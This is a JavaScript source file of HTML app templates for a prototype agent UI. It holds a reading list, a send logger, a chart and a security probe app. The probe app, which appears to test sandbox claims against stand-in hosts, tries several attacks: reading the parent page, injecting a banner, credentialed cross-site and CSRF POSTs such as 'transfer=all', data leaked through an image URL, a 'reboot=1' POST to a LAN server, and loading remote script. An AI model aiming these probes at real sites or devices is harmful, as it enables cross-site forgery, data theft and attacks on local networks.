// Apps for the flexible-apps prototype (designs/prototypes/flexible-apps.md), which the mock librarian shows. Plain
// HTML with inline script, as a real agent sends to show_app.

/** A reading list the person edits; every change is published, so the agent reads it with read_app, no card. */
export const readingListApp = () => `
<style>
  .rl { padding: 14px; display: flex; flex-direction: column; gap: 12px; }
  .rl table { width: 100%; border-collapse: collapse; table-layout: fixed; }
  .rl th, .rl td { padding: 6px 8px; border-bottom: 1px solid var(--line); text-align: left; vertical-align: middle; }
  .rl th:nth-child(2), .rl th:nth-child(3) { width: 30%; }
  .rl .select, .rl .input { width: 100%; min-width: 0; }
  .rl-row { display: flex; gap: 8px; align-items: end; flex-wrap: wrap; }
  .rl-row .field { flex: 1 1 180px; }
</style>
<div class="rl">
  <p class="small dim" id="st" role="status">Your changes go to the librarian as you make them.</p>
  <table><thead><tr><th scope="col">Book</th><th scope="col">Status</th><th scope="col">Rating</th></tr></thead><tbody id="rows"></tbody></table>
  <form class="rl-row" id="add">
    <div class="field"><label class="label" for="nb">Add a book</label><input class="input" id="nb" autocomplete="off"></div>
    <button class="btn" type="submit">Add</button>
  </form>
  <div class="rl-row"><button class="btn" type="button" id="ask" style="border-color:var(--accent)">Ask the librarian about my list</button></div>
</div>
<script>
  const STATUSES = ['To read', 'Reading', 'Done'];
  let rows = [
    { title: 'Middlemarch', status: 'Reading', rating: 0 },
    { title: 'Persuasion', status: 'To read', rating: 0 },
    { title: 'Emma', status: 'Done', rating: 4 },
  ];
  const $ = (id) => document.getElementById(id);
  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c]);
  function share() {
    postbox.saveState({ rows });
    postbox.publish({ rows }).then(() => ($('st').textContent = 'Shared with the librarian at ' + new Date().toLocaleTimeString('en-US') + '. No turn, no card.'));
  }
  function draw() {
    $('rows').innerHTML = rows
      .map((r, i) => '<tr><td>' + esc(r.title) + '</td>' +
        '<td><select class="select" data-i="' + i + '" data-k="status" aria-label="Status of ' + esc(r.title) + '">' +
        STATUSES.map((s) => '<option' + (s === r.status ? ' selected' : '') + '>' + s + '</option>').join('') + '</select></td>' +
        '<td><input class="input" type="number" min="0" max="5" data-i="' + i + '" data-k="rating" value="' + r.rating + '" aria-label="Rating of ' + esc(r.title) + ', 0 to 5"></td></tr>')
      .join('');
  }
  $('rows').addEventListener('change', (e) => {
    const t = e.target, i = +t.dataset.i;
    rows[i][t.dataset.k] = t.dataset.k === 'rating' ? Math.max(0, Math.min(5, +t.value || 0)) : t.value;
    share();
  });
  $('add').addEventListener('submit', (e) => {
    e.preventDefault();
    const v = $('nb').value.trim();
    if (!v) return;
    rows.push({ title: v, status: 'To read', rating: 0 });
    $('nb').value = '';
    draw();
    share();
  });
  $('ask').addEventListener('click', () =>
    postbox.send('review-list', { books: rows.length }, 'Asked about ' + rows.length + ' books').then(
      (r) => ($('st').textContent = r.noted ? 'Kept as a note for the librarian’s next turn.' : 'Sent. The librarian is reading your list.'),
      (err) => ($('st').textContent = err.message),
    ));
  postbox.restoreState().then((s) => {
    if (s?.rows) rows = s.rows;
    draw();
  });
</script>`;

/** Every way an app sends, each logged with what Postbox did with it: the repro for “I have to approve again”. */
export const sendProbeApp = () => `
<style>
  .sp { padding: 14px; display: flex; flex-direction: column; gap: 10px; }
  .sp-row { display: flex; gap: 8px; flex-wrap: wrap; }
  .sp ol { margin: 0; padding-left: 20px; font-size: 13px; }
</style>
<div class="sp">
  <div class="sp-row">
    <button class="btn" type="button" id="now">Send now</button>
    <button class="btn" type="button" id="late">Send after a 6-second wait</button>
    <button class="btn" type="button" id="many">Send 7 at once</button>
    <a class="btn" href="http://127.0.0.1:4518/" id="link">Open the stand-in site</a>
  </div>
  <p class="small dim">A send with no click goes 2 seconds after the app loads.</p>
  <ol id="log" aria-live="polite"></ol>
</div>
<script>
  const log = [];
  const $ = (id) => document.getElementById(id);
  function out(what, p) {
    p.then((r) => r.held ? 'held on a card (' + r.waiting + ' waiting)' : r.noted ? 'a note for the next turn' : 'sent at once',
      (e) => 'refused: ' + e.message).then((how) => {
      log.push({ what, how });
      $('log').insertAdjacentHTML('beforeend', '<li>' + what + ': <b>' + how + '</b></li>');
      postbox.publish?.({ log });
    });
  }
  $('now').onclick = () => out('click, at once', postbox.send('probe', { n: 1 }, 'Probe: at once'));
  $('late').onclick = () => setTimeout(() => out('click, 6 s later', postbox.send('probe', { n: 2 }, 'Probe: 6 s later')), 6000);
  $('many').onclick = () => { for (let i = 0; i < 7; i++) out('click, ' + (i + 1) + ' of 7', postbox.send('probe', { n: 10 + i }, 'Probe ' + (i + 1) + ' of 7')); };
  setTimeout(() => out('no click, on load', postbox.send('probe', { n: 0 }, 'Probe: on its own')), 2000);
</script>`;

/**
 * Tries each thing the security claims are about, from inside an app, and shows and publishes what happened.
 * other: the stand-in for another site (a different site from Postbox’s page); lan: the same server on this computer’s
 * local network address; postbox: Postbox’s own origin; popup: also try a popup with no click, last.
 */
export const netProbeApp = ({ other, lan, postbox, popup = false }) => `
<style>
  .np { padding: 14px; display: flex; flex-direction: column; gap: 10px; }
  .np table { width: 100%; border-collapse: collapse; font-size: 13px; }
  .np th, .np td { padding: 5px 8px; border-bottom: 1px solid var(--line); text-align: left; vertical-align: top; overflow-wrap: anywhere; }
</style>
<div class="np">
  <p class="small dim" id="mode" role="status">Running the probes…</p>
  <div class="sp-row" style="display:flex;gap:8px;flex-wrap:wrap">
    <button class="btn" type="button" id="pop">Open the stand-in site with a click (window.open)</button>
    <a class="btn" href="${other}/" id="lnk">A link to the stand-in site</a>
  </div>
  <table><thead><tr><th scope="col">Probe</th><th scope="col">Result</th></tr></thead><tbody id="out"></tbody></table>
</div>
<script>
  const OTHER = ${JSON.stringify(other)}, LAN = ${JSON.stringify(lan)}, PB = ${JSON.stringify(postbox)};
  const run = 'r' + Math.random().toString(36).slice(2, 8);
  const results = [];
  const $ = (id) => document.getElementById(id);
  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c]);
  const short = (s) => String(s).slice(0, 160);
  async function probe(name, fn) {
    let result;
    try { result = short(await fn()); } catch (e) { result = 'blocked: ' + short(e.message || e); }
    results.push({ name, result });
    $('out').insertAdjacentHTML('beforeend', '<tr><td>' + esc(name) + '</td><td>' + esc(result) + '</td></tr>');
  }
  const seen = async (id) => {
    const r = await fetch(OTHER + '/seen/' + id).then((x) => x.json()).catch(() => null);
    return r ? (r.hit ? 'reached it' + (r.cookie ? ', with cookies: ' + r.cookie : ', no cookies') + ' (Sec-Fetch-Site ' + r.site + ')' : 'never reached it') : 'couldn’t ask the stand-in site';
  };
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  document.getElementById('pop').onclick = () => {
    const w = window.open(OTHER + '/?clicked', '_blank');
    results.push({ name: 'window.open after a click', result: w ? 'a window opened' : 'returned null' });
    postbox.publish({ run, origin: self.origin, results });
  };
  (async () => {
    await postbox.ready;
    // The pre-display check runs this page too, in hidden frames: probe only in the one the person sees.
    if (postbox.check) return;
    $('mode').textContent = 'Origin of this app: ' + (self.origin || 'unknown') + '. Run ' + run + '.';
    await probe('Origin of this app', async () => self.origin);
    await probe('Read document.cookie here', async () => JSON.stringify(document.cookie));
    await probe('Read the Postbox page (parent.document)', async () => 'read: “' + parent.document.title + '”');
    await probe('Change the Postbox page', async () => {
      const b = parent.document.createElement('div');
      b.textContent = 'An app changed this page';
      b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:99999;background:var(--alert-ink);color:var(--bg);padding:8px;font:14px sans-serif';
      parent.document.body.appendChild(b);
      return 'added a banner to the Postbox page';
    });
    await probe('Read the top window’s URL', async () => top.location.href);
    await probe('GET Postbox /api/state and read it', async () => {
      const r = await fetch(PB + '/api/state', { credentials: 'include' });
      return 'status ' + r.status + ', ' + (await r.text()).length + ' characters read';
    });
    await probe('POST to Postbox’s API as the person (publish to this app)', async () => {
      const r = await fetch(PB + '/api/apps/' + encodeURIComponent((await postbox.ready).appId) + '/publish', {
        method: 'POST', credentials: 'include', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ data: { wroteBy: 'the app itself', run } }),
      });
      return 'status ' + r.status + ': ' + (await r.text()).slice(0, 90);
    });
    await probe('Simple POST to Postbox’s API, no preflight (a note on this app)', async () => {
      await fetch(PB + '/api/apps/' + encodeURIComponent((await postbox.ready).appId) + '/note', {
        method: 'POST', mode: 'no-cors', credentials: 'include', headers: { 'content-type': 'text/plain' }, body: JSON.stringify({ action: 'csrf', values: { run } }),
      });
      return 'sent; whether Postbox took it shows as a “csrf” note on this app';
    });
    await probe('GET a public JSON file from the other site, and read it', async () => {
      const r = await fetch(OTHER + '/data.json');
      return 'status ' + r.status + ', read ' + (await r.json()).series.length + ' series';
    });
    await probe('Credentialed GET to the other site (signed in there)', async () => {
      await fetch(OTHER + '/probe/' + run + '-get', { credentials: 'include', mode: 'no-cors' });
      return seen(run + '-get');
    });
    await probe('Credentialed POST to the other site (a write)', async () => {
      await fetch(OTHER + '/probe/' + run + '-post', { method: 'POST', credentials: 'include', mode: 'no-cors', body: 'transfer=all' });
      return seen(run + '-post');
    });
    await probe('Read a credentialed response from the other site', async () => {
      const r = await fetch(OTHER + '/probe/' + run + '-read', { credentials: 'include' });
      return 'read: ' + (await r.text()).slice(0, 60);
    });
    await probe('Image from the other site (data out in a URL)', async () => {
      const img = new Image();
      img.alt = '';
      img.src = OTHER + '/probe/' + run + '-img?secret=hello';
      await wait(800);
      return seen(run + '-img');
    });
    await probe('GET a server on the local network (' + LAN + ')', async () => {
      const r = await fetch(LAN + '/data.json');
      return 'status ' + r.status + ', read ' + (await r.json()).series.length + ' series';
    });
    await probe('POST to a local network server with no CORS (a write)', async () => {
      await fetch(LAN + '/probe/' + run + '-lan', { method: 'POST', mode: 'no-cors', body: 'reboot=1' });
      const r = await fetch(LAN + '/seen/' + run + '-lan').then((x) => x.json());
      return r.hit ? 'reached it (Sec-Fetch-Site ' + r.site + ')' : 'never reached it';
    });
    await probe('Script from the other site', async () => {
      await new Promise((ok, no) => { const s = document.createElement('script'); s.src = OTHER + '/probe/' + run + '-js'; s.onload = ok; s.onerror = () => no(new Error('the script didn’t load')); document.head.appendChild(s); });
      return 'loaded and ran';
    });
    await probe('net.fetch the other site through Postbox', async () => JSON.stringify(await postbox.query('net.fetch', { url: OTHER + '/data.json' })).slice(0, 80));
    await probe('net.fetch Postbox itself through Postbox', async () => JSON.stringify(await postbox.query('net.fetch', { url: PB + '/api/state' })).slice(0, 80));
    await probe('net.fetch the local network through Postbox', async () => JSON.stringify(await postbox.query('net.fetch', { url: LAN + '/data.json' })).slice(0, 80));
    postbox.publish({ run, origin: self.origin, results });
    // Last, since in some browsers it takes the person away from Postbox: a popup with no click in the app.
    if (${popup ? 'true' : 'false'}) await probe('window.open with no click', async () => (window.open(OTHER + '/?noclick', '_blank') ? 'a window opened' : 'returned null'));
  })();
</script>`;

/** A chart whose data comes from another site: straight from the app (variant A) or through Postbox (C). */
export const pulledChartApp = ({ other }) => `
<style>.pc { padding: 14px; display: flex; flex-direction: column; gap: 8px; }</style>
<div class="pc">
  <p class="small dim" id="how" role="status">Loading the data…</p>
  <div id="chart"></div>
</div>
<script>
  const URL_ = ${JSON.stringify(`${other}/data.json`)};
  async function data() {
    try {
      const d = await fetch(URL_).then((r) => r.json());
      document.getElementById('how').textContent = 'Fetched by the app itself from ' + URL_;
      return d;
    } catch {}
    try {
      const r = await postbox.query('net.fetch', { url: URL_ });
      document.getElementById('how').textContent = 'Fetched through Postbox (net.fetch) from ' + URL_;
      return JSON.parse(r.text);
    } catch (e) {
      document.getElementById('how').textContent = 'Couldn’t load ' + URL_ + ': ' + e.message;
      return null;
    }
  }
  data().then((d) => {
    if (!d) return;
    postbox.charts.line(document.getElementById('chart'), { x: d.x, series: d.series, height: 220 });
    postbox.publish({ source: URL_, points: d.x.length });
  });
</script>`;
